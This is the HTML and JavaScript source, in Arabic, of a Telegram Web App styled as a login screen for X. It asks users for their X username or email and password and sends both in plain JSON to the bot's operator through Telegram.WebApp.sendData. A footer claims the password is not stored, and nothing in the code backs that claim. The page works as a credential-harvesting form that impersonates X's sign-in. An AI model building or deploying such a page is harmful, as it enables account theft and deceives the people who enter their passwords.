<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>X Bot - تسجيل الدخول</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #1a1a2e;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 360px; width: 100%; }
        h1 { font-size: 22px; margin-bottom: 8px; color: #ffffff; text-align: center; }
        .subtitle { font-size: 14px; color: #a0a0c0; margin-bottom: 24px; text-align: center; }
        .field { margin-bottom: 16px; }
        label { display: block; font-size: 13px; color: #a0a0c0; margin-bottom: 6px; }
        input {
            width: 100%;
            padding: 12px 16px;
            background: #16213e;
            border: 1px solid #2a2a4a;
            border-radius: 10px;
            color: #e0e0e0;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus { border-color: #1d9bf0; }
        input::placeholder { color: #555; }
        .btn {
            display: inline-block;
            padding: 14px 32px;
            background: #1d9bf0;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
            transition: background 0.2s;
        }
        .btn:hover { background: #1a8cd8; }
        .btn:disabled { background: #555; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 12px; color: #555; text-align: center; }
        .error { color: #ff4444; font-size: 13px; margin-top: 8px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 تسجيل الدخول إلى X</h1>
        <p class="subtitle">أدخل بيانات حساب X الخاص بك</p>
        <form id="loginForm">
            <div class="field">
                <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
                <input type="text" id="username" placeholder="مثال: @user أو user@email.com" required autocomplete="username">
            </div>
            <div class="field">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password">
            </div>
            <button type="submit" class="btn" id="submitBtn">🔐 تسجيل الدخول</button>
            <div class="error" id="errorMsg">الرجاء ملء جميع الحقول</div>
        </form>
        <div class="footer">⚠️ لن تُحفظ كلمة المرور وتُستخدم فقط لتسجيل الدخول لمرة واحدة</div>
    </div>
    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const errorEl = document.getElementById('errorMsg');
            const btn = document.getElementById('submitBtn');

            if (!username || !password) {
                errorEl.style.display = 'block';
                return;
            }
            errorEl.style.display = 'none';
            btn.disabled = true;
            btn.textContent = '🔄 جاري الإرسال...';

            Telegram.WebApp.sendData(JSON.stringify({ username, password }));
            Telegram.WebApp.close();
        });
    </script>
</body>
</html>
